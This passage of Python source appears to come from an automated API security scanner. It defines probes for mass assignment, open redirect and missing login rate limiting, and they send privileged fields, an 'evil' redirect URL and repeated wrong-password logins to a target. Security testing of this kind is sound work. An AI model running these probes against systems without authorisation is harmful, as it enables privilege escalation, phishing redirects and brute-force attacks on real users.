def mass_assignment_probe(model, base_url: str, *, session: requests.Session | None = None,
                          auth: dict | None = None) -> list[ProbeFinding]:
    """
    Mass assignment / BOPLA (OWASP API6): registration binds the whole request body
    to the model, so a client can smuggle a privileged field (admin=true, role=admin).
    We register with those extra fields and confirm ONLY when the created record the
    server returns echoes one back as set — proof the field was accepted, not stripped.
    A normal body never contains them, so this is a controlled, low-FP signal. P2.
    """
    sess = session or requests.Session()
    from core.auth_recipe import derive_auth_recipe, register_body
    recipe = derive_auth_recipe(model)
    base = base_url.rstrip("/")
    out: list[ProbeFinding] = []

    ident = f"massassign_{uuid.uuid4().hex[:8]}@example.com"
    body = register_body(recipe, model, ident)
    body.update(_PRIV_FIELDS)
    try:
        r = sess.post(f"{base}{recipe['register_path']}", json=body, timeout=15)
    except Exception:
        return out
    if r.status_code >= 300:
        return out
    _record_created(sess, _collection_of(recipe["register_path"]), body, {})
    try:
        data = r.json()
    except Exception:
        return out
    # Flatten one level so a {"user": {...}} wrapper is still inspected.
    scopes = [data] + ([v for v in data.values() if isinstance(v, dict)] if isinstance(data, dict) else [])
    granted = []
    for scope in scopes:
        if not isinstance(scope, dict):
            continue
        for k, v in _PRIV_FIELDS.items():
            if k in scope and scope[k] == v:
                granted.append(f"{k}={v}")
    if granted:
        out.append(ProbeFinding(
            probe="mass-assignment",
            title=f"Mass assignment: registration accepted privileged field(s) {', '.join(sorted(set(granted)))}",
            exploited=True, severity="P2",
            evidence=(f"POST {recipe['register_path']} with extra field(s) in the body returned a "
                      f"created record echoing {', '.join(sorted(set(granted)))}. The server bound "
                      f"client-supplied fields it should never let a user set (privilege escalation)."),
            target=recipe["register_path"]))
    return out


# Parameter names commonly used for post-action redirects.
_REDIRECT_PARAMS = ("next", "url", "redirect", "redirect_uri", "redirect_url", "return",
                    "returnTo", "return_to", "dest", "destination", "continue", "to", "goto")
_REDIRECT_EVIL = "https://qax-redirect.example/evil"
# Endpoint-path hints where a redirect target is commonly taken from a parameter.
_REDIRECT_EP_KW = ("login", "logout", "redirect", "oauth", "sso", "auth", "continue",
                   "return", "callback", "next", "goto", "signin", "signout")


def open_redirect_probe(model, base_url: str, *, session: requests.Session | None = None,
                        auth: dict | None = None) -> list[ProbeFinding]:
    """
    Open redirect (OWASP): a redirect target taken from a request parameter without an
    allow-list lets an attacker bounce victims to a site they control (phishing, OAuth
    token theft). We pass an external URL in common redirect params and confirm ONLY
    when the response's Location header actually points at our external host — the
    redirect itself is the proof. P2. Near-zero FP.
    """
    sess = session or requests.Session()
    from urllib.parse import urlparse
    base = base_url.rstrip("/")
    out: list[ProbeFinding] = []
    evil_host = urlparse(_REDIRECT_EVIL).netloc

    # Open redirects almost always live on auth/navigation endpoints, so test the
    # root plus GET endpoints whose path hints at a redirect — not every GET × every
    # param (which would explode on a large API). Capped for safety.
    targets = ["/"]
    for e in getattr(model, "endpoints", []):
        if (isinstance(e, dict) and str(e.get("method", "")).upper() == "GET"
                and "{" not in str(e.get("path", ""))
                and any(k in str(e.get("path", "")).lower() for k in _REDIRECT_EP_KW)):
            targets.append(str(e.get("path", "")))
    targets = targets[:6]
    seen_target: set = set()
    for path in targets:
        if path in seen_target:
            continue
        seen_target.add(path)
        for param in _REDIRECT_PARAMS:
            url = f"{base}{path}?{param}={_REDIRECT_EVIL}"
            try:
                r = sess.get(url, headers={}, allow_redirects=False, timeout=15)
            except Exception:
                continue
            if 300 <= getattr(r, "status_code", 0) < 400:
                loc = (r.headers.get("Location") or "").strip()
                if urlparse(loc).netloc == evil_host:
                    out.append(ProbeFinding(
                        probe="open-redirect",
                        title=f"Open redirect via '{param}' on {path}",
                        exploited=True, severity="P2",
                        evidence=(f"GET {path}?{param}={_REDIRECT_EVIL} responded {r.status_code} with "
                                  f"Location: {loc[:120]} — the app redirects to an attacker-controlled "
                                  f"external host taken straight from the request parameter."),
                        target=path))
                    return out  # one proof is enough
    return out


def rate_limit_probe(model, base_url: str, *, session: requests.Session | None = None,
                     auth: dict | None = None) -> list[ProbeFinding]:
    """
    Missing brute-force protection (OWASP API4): the login endpoint should throttle or
    lock after repeated failures. We register a user, then send 12 wrong-password logins;
    if NONE are rate-limited (429) or locked (423) the endpoint has no brute-force guard.
    Reported as a P3 lead — absence of a control, not a proven exploit — so it never
    inflates the confirmed count.
    """
    sess = session or requests.Session()
    from core.auth_recipe import derive_auth_recipe, register_body
    recipe = derive_auth_recipe(model)
    base = base_url.rstrip("/")
    out: list[ProbeFinding] = []

    ident = f"ratelimit_{uuid.uuid4().hex[:8]}@example.com"
    try:
        reg = sess.post(f"{base}{recipe['register_path']}", json=register_body(recipe, model, ident), timeout=15)
    except Exception:
        return out
    if getattr(reg, "status_code", 500) >= 300:
        return out  # couldn't create the account → can't judge login throttling

    bad_login = {recipe["id_field"]: ident, recipe["secret_field"]: "wrong-" + uuid.uuid4().hex[:6]}
    statuses: list[int] = []
    for _ in range(12):
        try:
            r = sess.post(f"{base}{recipe['login_path']}", json=bad_login, timeout=15)
        except Exception:
            return out
        statuses.append(getattr(r, "status_code", 0))
    throttled = any(s in (429, 423) for s in statuses)
    # Only speak when every attempt was a normal auth failure (4xx) and none throttled —
    # avoids firing on an endpoint that errored or behaved oddly.
    if not throttled and statuses and all(400 <= s < 500 for s in statuses):
        out.append(ProbeFinding(
            probe="rate-limit",
            title="No rate limiting / lockout on the login endpoint",
            exploited=True, severity="P3",
            evidence=(f"12 consecutive failed logins at {recipe['login_path']} all returned "
                      f"HTTP {statuses[-1]} with no 429/423 — the endpoint has no visible "
                      f"brute-force throttling or account lockout."),
            target=recipe["login_path"]))
    return out
